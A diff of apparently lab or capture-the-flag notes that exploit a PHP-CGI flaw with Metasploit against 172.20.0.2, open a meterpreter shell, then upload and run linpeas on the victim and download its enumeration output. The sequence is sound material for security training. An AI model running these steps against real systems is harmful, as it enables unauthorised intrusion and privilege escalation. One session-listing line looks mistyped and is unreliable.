@@ -117,24 +117,29 @@ msfconsole
 search php_cgi
 use 0
 set rhosts 172.20.0.2
-exploit
+exploit 
+
 # we get a meterpreter session
-# from here, we upload the linpeas script to the victim
-upload linpeas.sh .
-shell #we open a shell in victim
-ls #check file was uploaded successfully
+upload linpeas_linux_amd64 . # from here, we upload the linpeas script to the victim
+shell # we open a shell in victim
+ls # check file was uploaded successfully
 chmod 777 linpeas_linux_amd64
 ./linpeas_linux_amd64 -a > out.txt
+exit
 ```
 From meterpreter:
 ```bash
 download out.txt
-# Go back to msfconsole
-bg
-
+bg # Go back to msfconsole
 ```
+
 From kali terminal:
 ```bash
-# Open linpeas file
-less -r out.txt
+less -r out.txt # Open linpeas file
+```
+
+Go back to the session:
+```bash
+sessions -i* # list sessions
+sessions -i 1 # go back to the first session
 ```
